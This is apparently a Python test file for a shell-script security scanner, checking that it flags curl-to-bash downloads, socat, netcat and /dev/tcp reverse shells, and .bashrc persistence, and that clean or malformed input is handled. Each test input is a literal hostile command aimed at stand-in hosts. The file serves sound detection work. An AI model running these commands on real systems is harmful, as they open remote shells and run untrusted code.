"""Shell analysis tests (M3, §4.4) — reverse shells, curl|bash, rc-file persistence."""

from __future__ import annotations

from analyzer.config import DEFAULT_CONFIG
from analyzer.layers.ast_shell import scan_shell_text
from analyzer.models import Category, Severity


def test_curl_pipe_bash_is_flagged():
    f = scan_shell_text("curl http://evil.example/x | bash", "run.sh", DEFAULT_CONFIG)
    hit = next(x for x in f if x.category is Category.COMMAND_EXECUTION)
    assert hit.severity in (Severity.HIGH, Severity.CRITICAL)


def test_socat_reverse_shell_is_critical():
    f = scan_shell_text("socat tcp:evil.example:9001 exec:/bin/bash", "run.sh", DEFAULT_CONFIG)
    assert any(x.severity is Severity.CRITICAL for x in f)


def test_nc_reverse_shell_is_critical():
    f = scan_shell_text("nc -e /bin/bash 10.0.0.1 4444", "run.sh", DEFAULT_CONFIG)
    assert any(x.severity is Severity.CRITICAL for x in f)


def test_devtcp_reverse_shell():
    f = scan_shell_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "run.sh", DEFAULT_CONFIG)
    assert any(x.severity is Severity.CRITICAL for x in f)


def test_rc_file_persistence_is_flagged():
    f = scan_shell_text("echo 'evil' >> ~/.bashrc", "run.sh", DEFAULT_CONFIG)
    assert any(x.category is Category.COMMAND_EXECUTION for x in f)


def test_clean_shell_has_no_findings():
    f = scan_shell_text("echo hello\nls -la", "run.sh", DEFAULT_CONFIG)
    assert f == []


def test_garbage_does_not_crash():
    f = scan_shell_text("$(((( |& >>>", "run.sh", DEFAULT_CONFIG)
    assert isinstance(f, list)
